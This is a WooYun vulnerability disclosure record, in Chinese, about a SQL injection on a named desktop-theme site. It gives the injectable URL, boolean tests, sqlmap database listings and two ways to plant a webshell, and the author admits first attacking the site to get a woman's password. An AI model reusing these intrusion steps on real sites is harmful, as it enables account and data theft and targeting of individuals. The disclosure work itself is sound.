{"id": 4428, "wybug_id": "wooyun-2014-054236", "wybug_title": "魔法桌面主站注入15万用户数据及分站全部沦陷", "wybug_corp": "魔法桌面", "wybug_author": "李旭敏", "wybug_date": "2014-03-21 18:46", "wybug_open_date": "2014-05-05 18:46", "wybug_type": "SQL注射漏洞", "wybug_level": "高", "wybug_rank_0": "20", "wybug_status": "未联系到厂商或者厂商积极忽略", "wybug_from": "http://www.wooyun.org", "wybug_tags": ["第三方不可信程序", "数字类型注射", "后台被猜解"], "wybug_detail": "漏洞详情 披露状态：   \t\t\t\t\t\t\t\t\t2014-03-21：\t积极联系厂商并且等待厂商认领中，细节不对外公开\t\t\t\t\t\t\t\t\t2014-05-05：\t厂商已经主动忽略漏洞，细节向公众公开  简要描述： 嗯~终于能发一个有点质量的漏洞了，感谢来自星星的肉肉~谢谢你的奇葩sqlmap差点让我以为是个误报····目测这个CMS是属于通用型的 详细说明：  老实说，这网站我拿了一年···当年为了泡到一个妹纸，想拿下该网站权限以取得她的常用密码。当年各种扫描，google hack ，xss,社工，一个星期左右就放弃了。一年后的今天，她早已贵为人妻····大概看了看，是php的，然后后台地址是http://www.ommoo.com/admin/index.php?m=Public&a=login````注入在http://www.ommoo.com/u.php?action=prettify&uid=177071这里and 1=1 和and 1=2就能看出变化。丢入sqlmap跑跑···得到web application technology: Nginx, PHP 5.2.17back-end DBMS: MySQL 5.0[15:35:52] [INFO] fetching database names[15:35:52] [INFO] the SQL query used returns 8 entries[15:35:52] [INFO] resumed: information_schema[15:35:52] [INFO] resumed: ftpusers[15:35:52] [INFO] resumed: ms[15:35:52] [INFO] resumed: mysql[15:35:52] [INFO] resumed: test[15:35:52] [INFO] resumed: w3_ommoo_com[15:35:52] [INFO] resumed: wbl[15:35:52] [INFO] resumed: zol_wblavailable databases [8]:[*] ftpusers[*] information_schema[*] ms[*] mysql[*] test[*] w3_ommoo_com[*] wbl[*] zol_wbl\n\n\n\n找到myssql，是root权限。\n\n里面还有FTP的数据库，旁站可能有FTP管理器之类的···\n\n\n\n还有phpmyadmin~~\n\n\n\n拿下webshell很简单，有两种方法，根据两张图所诉的物理连接，通过注入拿到phpmyadmin的密码，然后导出webshell··第二种直接通过ftp管理添加帐号密码，然后上传个webshell。\n\n可以看到全部分站都在，可写可读···接下来就是用户数据``还好没有明文保存，话说我连我自己的密码都忘记了。\n\n打上个LOGO把··防止某些黑客拿截图去骗钱···可以看到含有f的是男的，含有m的是女生把。至于邮箱和密码一长串字符的，那些我估计应该是微博帐号或者QQ帐号绑定的。随便登陆一个官方帐号试试···\n\n   漏洞证明：  我很好奇你们用的是什么CMS··\n\n\n\n是巧合么，呵呵~\n\n构造关键字能找到一些模版相似的网站，没测试是否存在漏洞   修复方案：  我要是你的话，先弄个CDN，隐藏掉真实的IP。然后下载个啊D的查杀工具，定时查杀webshell。或者装过安全狗，查杀效果，不够啊D的webshell kill好，两者结合更佳。接着删除掉phpinfo,p.php探针啊，之类的文件。改一下后台目录。（妈蛋，那个真的后台么，为毛我有正确的密码登陆不进去··？）过滤注入语句，比如 and 1=2这些基础过滤掉要做好啦:) 有必要说一句，   版权声明：转载请注明来源 李旭敏@乌云\n ", "wybug_reply": "漏洞回应  厂商回应： 未能联系到厂商或者厂商积极拒绝  ", "replys": "漏洞评价：\n评论\n     2014-03-21 19:06 |    \t\t魇 \t\t\t( 普通白帽子  |\t\t\t        Rank:1207 漏洞数:104        | 传闻中魇是一个惊世奇男子，但是除了他华...)\t\t \n  前排关注一个~    \n     2014-05-05 22:06 |    \t\tlxa \t\t\t( 路人 |\t\t\t        Rank:5 漏洞数:3        | php审计)\t\t \n  一年,,,,就做了这点?    \n     2014-05-05 22:26 |    \t\t4399gdww \t\t\t( 路人 |\t\t\t        Rank:20 漏洞数:4        | )\t\t \n  这是个悲伤的故事    \n     2014-05-05 22:52 |    \t\tAres \t\t\t( 路人 |\t\t\t        Rank:29 漏洞数:8        | 来自幼儿园大班)\t\t \n  关注后面的cms。。    \n     2014-05-07 15:12 |    \t\t风的传奇 \t\t\t( 路人 |\t\t\t        Rank:1 漏洞数:2        | 没有什么了不起，混迹于茫茫网络而已。)\t\t \n  人妻亮了。    \n     2014-05-08 19:20 |    \t\tBlack Angel \t\t\t( 普通白帽子  |\t\t\t        Rank:163 漏洞数:35        | 最神奇的一群人，智慧低调又内敛，俗称马甲...)\t\t \n  一年,,,,就做了这点?     \n  \n\n\n", "wybug_level_fromcorp": "无影响厂商忽略", "wybug_rank_fromcorp": 0, "Ranks": null}